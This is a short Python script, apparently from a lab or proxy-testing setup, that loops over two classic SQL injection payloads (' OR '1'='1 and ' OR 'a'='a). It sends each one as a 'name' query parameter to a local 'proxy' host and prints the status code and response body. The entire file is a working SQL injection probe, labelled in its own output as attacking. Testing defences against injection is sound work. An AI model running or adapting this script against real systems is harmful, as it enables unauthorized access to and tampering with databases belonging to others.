import requests

PROXY_URL = "http://proxy:5000/"

payloads = [
    "' OR '1'='1", 
    "' OR 'a'='a", 
]

def perform_sql_injection():
    for payload in payloads:
        print(f"Attacking with SQL Injection payload: {payload}")
        response = requests.get(PROXY_URL, params={'name': payload})
        print(f"Response: {response.status_code} - {response.text}")

if __name__ == "__main__":
    perform_sql_injection()
